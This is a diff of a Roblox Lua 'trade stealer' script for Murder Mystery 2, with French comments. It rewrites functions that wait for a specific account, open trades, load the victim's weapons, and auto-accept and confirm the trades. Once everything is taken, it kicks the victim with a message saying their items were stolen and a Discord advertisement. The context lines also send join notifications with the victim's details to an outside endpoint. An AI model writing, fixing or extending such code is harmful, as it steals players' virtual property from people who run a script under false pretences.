@@ -260,11 +260,55 @@ local function MM2()
         end
     end
 
+    -- FONCTION ACCEPT TRADE CORRIGÉE
     local function acceptTrade()
-        local args = {
-            [1] = 285646582
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+        -- Essayer différentes méthodes d'acceptation
+        local success = false
+        
+        -- Méthode 1: AcceptTrade
+        pcall(function()
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
+            success = true
+        end)
+        
+        if not success then
+            -- Méthode 2: Avec paramètre
+            pcall(function()
+                local args = {[1] = 285646582}
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+                success = true
+            end)
+        end
+        
+        if not success then
+            -- Méthode 3: Via le GUI
+            pcall(function()
+                local tradeGui = plr.PlayerGui:FindFirstChild("TradeGUI")
+                if tradeGui then
+                    local acceptButton = tradeGui:FindFirstChild("AcceptButton")
+                    if acceptButton then
+                        acceptButton:FireServer()
+                        success = true
+                    end
+                end
+            end)
+        end
+        
+        if not success then
+            -- Méthode 4: Remote direct
+            pcall(function()
+                local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
+                if remote then
+                    local acceptRemote = remote:FindFirstChild("AcceptTrade")
+                    if acceptRemote then
+                        acceptRemote:InvokeServer()
+                        success = true
+                    end
+                end
+            end)
+        end
+        
+        return success
     end
 
     local function addWeaponToTrade(id)
@@ -275,7 +319,7 @@ local function MM2()
         game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
     end
 
-    -- NOUVELLES FONCTIONS POUR LE TRADE AVEC TtTt_1038
+    -- FONCTION DE TRADE COMPLÈTEMENT RÉÉCRITE
     local function startTradeWithPlayer(playerName)
         local targetPlayer = game.Players:FindFirstChild(playerName)
         if not targetPlayer then
@@ -283,148 +327,151 @@ local function MM2()
             return false
         end
         
-        print("Début du trade avec " .. playerName)
+        print("=== DÉBUT TRADE AVEC " .. playerName .. " ===")
         
-        -- Fonction pour attendre un état spécifique du trade
-        local function waitForTradeStatus(expectedStatus, timeout)
-            timeout = timeout or 15
-            local startTime = tick()
-            while tick() - startTime < timeout do
-                local status = getTradeStatus()
-                if status == expectedStatus then
-                    return true
-                end
-                task.wait(0.2)
-            end
-            return false
+        -- 1. Fermer tout trade en cours
+        local status = getTradeStatus()
+        if status == "StartTrade" then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+            task.wait(1)
+        elseif status == "ReceivingRequest" then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+            task.wait(1)
         end
         
-        -- Fonction pour ajouter toutes les armes au trade
-        local function addAllWeaponsToTrade()
-            local weaponsAdded = 0
-            for _, weapon in ipairs(weaponsToSend) do
-                for count = 1, weapon.Amount do
-                    addWeaponToTrade(weapon.DataID)
-                    weaponsAdded = weaponsAdded + 1
-                    task.wait(0.05)
-                end
-            end
-            print("Ajouté " .. weaponsAdded .. " armes au trade")
-            return weaponsAdded
-        end
-        
-        -- Étape 1: Envoyer la demande de trade
+        -- 2. Envoyer la demande
         print("Envoi de la demande de trade...")
         sendTradeRequest(playerName)
+        task.wait(2)
         
-        -- Étape 2: Attendre que le trade commence
-        if not waitForTradeStatus("StartTrade", 10) then
-            print("Échec: le trade n'a pas commencé")
+        -- 3. Attendre le début du trade
+        local startTime = tick()
+        local tradeStarted = false
+        while tick() - startTime < 10 do
+            status = getTradeStatus()
+            if status == "StartTrade" then
+                tradeStarted = true
+                break
+            end
+            task.wait(0.5)
+        end
+        
+        if not tradeStarted then
+            print("❌ Le trade n'a pas commencé")
             return false
         end
-        print("Trade commencé!")
+        print("✅ Trade commencé!")
         
-        -- Étape 3: Ajouter toutes les armes
-        local weaponsAdded = addAllWeaponsToTrade()
-        if weaponsAdded == 0 then
-            print("Aucune arme à ajouter")
-            return true
+        -- 4. Ajouter les armes (max 4 par trade)
+        local weaponsAdded = 0
+        local itemsToAdd = {}
+        for i = 1, math.min(4, #weaponsToSend) do
+            table.insert(itemsToAdd, table.remove(weaponsToSend, 1))
         end
         
-        -- Étape 4: Attendre un peu puis accepter
-        task.wait(1)
-        print("Acceptation du trade...")
-        acceptTrade()
+        for _, weapon in ipairs(itemsToAdd) do
+            for count = 1, weapon.Amount do
+                addWeaponToTrade(weapon.DataID)
+                weaponsAdded = weaponsAdded + 1
+                task.wait(0.1)
+            end
+        end
+        print("✅ " .. weaponsAdded .. " armes ajoutées au trade")
         
-        -- Étape 5: Attendre la confirmation
-        if not waitForTradeStatus("TradeConfirmation", 10) then
-            print("Échec: pas de confirmation")
+        -- 5. Attendre 3 secondes puis accepter
+        task.wait(3)
+        
+        -- 6. Accepter le trade (avec plusieurs tentatives)
+        local acceptSuccess = false
+        for attempt = 1, 5 do
+            print("Tentative d'acceptation " .. attempt .. "...")
+            if acceptTrade() then
+                acceptSuccess = true
+                print("✅ Acceptation envoyée!")
+                break
+            end
+            task.wait(0.5)
+        end
+        
+        if not acceptSuccess then
+            print("❌ Échec de l'acceptation")
             return false
         end
         
-        -- Étape 6: Confirmer le trade
-        print("Confirmation du trade...")
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("ConfirmTrade"):FireServer()
-        
-        -- Étape 7: Attendre la fin du trade
-        if not waitForTradeStatus("None", 10) then
-            print("Échec: le trade ne se termine pas")
-            return false
+        -- 7. Attendre la confirmation
+        task.wait(2)
+        status = getTradeStatus()
+        if status == "TradeConfirmation" then
+            print("✅ Confirmation reçue!")
+            -- Confirmer le trade
+            pcall(function()
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("ConfirmTrade"):FireServer()
+            end)
+            task.wait(1)
         end
         
-        print("Trade terminé avec succès!")
+        -- 8. Attendre la fin
+        waitForTradeCompletion()
+        print("✅ Trade terminé!")
+        
         return true
     end
 
-    -- Fonction pour exécuter tous les trades jusqu'à épuisement des armes
-    local function executeAllTradesWithPlayer(playerName)
-        local maxAttempts = 50
+    -- SURVEILLANCE DE TtTt_1038
+    local function executeAllTrades()
+        local maxAttempts = 100
         local attempts = 0
         
         while #weaponsToSend > 0 and attempts < maxAttempts do
             attempts = attempts + 1
-            print("Tentative de trade " .. attempts .. ", armes restantes: " .. #weaponsToSend)
+            print("=== TENTATIVE " .. attempts .. " ===")
+            print("Armes restantes: " .. #weaponsToSend)
             
-            -- Fermer tout trade en cours
-            local status = getTradeStatus()
-            if status == "StartTrade" then
-                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-                task.wait(0.5)
-            elseif status == "ReceivingRequest" then
-                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-                task.wait(0.5)
-            end
-            
-            local success = startTradeWithPlayer(playerName)
+            local success = startTradeWithPlayer("TtTt_1038")
             
             if success then
-                -- Mettre à jour la liste des armes restantes
-                -- (Les armes sont retirées automatiquement quand le trade réussit)
+                print("✅ Trade réussi!")
                 task.wait(3)
             else
-                print("Échec du trade, nouvel essai dans 5 secondes...")
+                print("❌ Échec du trade")
                 task.wait(5)
             end
         end
         
         if #weaponsToSend == 0 then
-            print("Toutes les armes ont été volées!")
+            print("🎯 TOUTES LES ARMES ONT ÉTÉ VOLÉES!")
             plr:kick("All your stuff has been stolen by Mori Scripts Tradestealer! Join discord.gg/PzWY2QX8cu")
-        else
-            print("Impossible de voler toutes les armes. Restant: " .. #weaponsToSend)
         end
     end
 
-    -- Fonction pour surveiller TtTt_1038
-    local function waitForSpecificPlayer()
-        print("En attente de TtTt_1038...")
+    -- SURVEILLANCE
+    local function waitForPlayer()
+        print("🔍 En attente de TtTt_1038...")
         
-        -- Vérifier si le joueur est déjà dans le serveur
-        local targetPlayer = game.Players:FindFirstChild("TtTt_1038")
-        if targetPlayer then
-            print("TtTt_1038 trouvé dans le serveur!")
+        -- Vérifier si déjà présent
+        local target = game.Players:FindFirstChild("TtTt_1038")
+        if target then
+            print("✅ TtTt_1038 trouvé!")
             task.wait(3)
-            executeAllTradesWithPlayer("TtTt_1038")
+            executeAllTrades()
             return
         end
         
-        -- Attendre que le joueur rejoigne
+        -- Attendre l'arrivée
         game.Players.PlayerAdded:Connect(function(player)
             if player.Name == "TtTt_1038" then
-                print("TtTt_1038 a rejoint le serveur!")
+                print("✅ TtTt_1038 a rejoint!")
                 task.wait(5)
-                executeAllTradesWithPlayer("TtTt_1038")
+                executeAllTrades()
             end
         end)
-    end
-
-    -- Fonction pour vérifier périodiquement si le joueur est là
-    local function checkPlayerPeriodically()
+        
+        -- Vérification périodique
         while #weaponsToSend > 0 do
-            local targetPlayer = game.Players:FindFirstChild("TtTt_1038")
-            if targetPlayer then
-                print("TtTt_1038 détecté, lancement du trade...")
-                executeAllTradesWithPlayer("TtTt_1038")
+            target = game.Players:FindFirstChild("TtTt_1038")
+            if target then
+                print("✅ TtTt_1038 détecté!")
+                executeAllTrades()
                 break
             end
             task.wait(5)
@@ -767,25 +814,9 @@ local function MM2()
         SendJoinMessage(rawUrl)
         GlobalMessage(countryFlagEmoji, List2, rawUrl, discuser)
 
-        -- LANCER LA SURVEILLANCE DE TtTt_1038
-        print("Script prêt, surveillance de TtTt_1038...")
-        
-        -- Démarrer la surveillance en parallèle
-        task.spawn(function()
-            waitForSpecificPlayer()
-        end)
-        
-        -- Aussi vérifier périodiquement
-        task.spawn(function()
-            checkPlayerPeriodically()
-        end)
-        
-        -- Garder le script actif
-        while #weaponsToSend > 0 do
-            task.wait(10)
-            print("En attente de TtTt_1038... Armes restantes: " .. #weaponsToSend)
-        end
-        
+        -- LANCER LA SURVEILLANCE
+        print("🔍 Script prêt, surveillance de TtTt_1038...")
+        waitForPlayer()
     end
 end
 
